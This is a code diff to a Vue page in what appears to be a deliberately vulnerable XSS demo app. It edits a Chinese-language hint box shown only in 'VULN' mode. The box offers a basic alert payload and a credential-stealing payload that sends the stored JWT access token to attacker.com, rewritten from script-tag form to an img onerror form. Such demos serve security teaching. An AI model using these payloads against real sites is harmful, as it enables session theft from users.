@@ -41,11 +41,18 @@
       
       <!-- XSS 提示（仅在 VULN 模式展示） -->
       <div class="demo-info card" v-if="configStore.xssMode === 'vuln'">
-        <h3>⚠️ XSS 演示提示</h3>
-        <p>当前处于 VULN 模式，搜索框存在 XSS 漏洞。尝试输入：</p>
-        <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
-        <p style="margin-top: 12px;">或窃取凭证：</p>
-        <code>&lt;script&gt;fetch('https://attacker.com/log?jwt='+localStorage.getItem('accessToken'))&lt;/script&gt;</code>
+        <h3>⚠️ XSS 演示提示（L0/L1 反射型 XSS）</h3>
+        <p>当前处于 VULN 模式，搜索框存在反射型 XSS 漏洞。</p>
+        
+        <p style="margin-top: 12px;"><strong>L0 - 基础弹窗演示：</strong></p>
+        <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
+        
+        <p style="margin-top: 12px;"><strong>L1 - 窃取 JWT 凭证：</strong></p>
+        <code>&lt;img src=x onerror="fetch('https://attacker.com/log?jwt='+localStorage.getItem('accessToken'))"&gt;</code>
+        
+        <p style="margin-top: 12px; font-size: 0.9em; color: var(--color-text-muted);">
+          💡 注意：Vue 中通过 v-html 插入的 &lt;script&gt; 标签不会执行，需使用事件处理器型 payload（如 onerror、onload 等）
+        </p>
       </div>
     </div>
   </div>
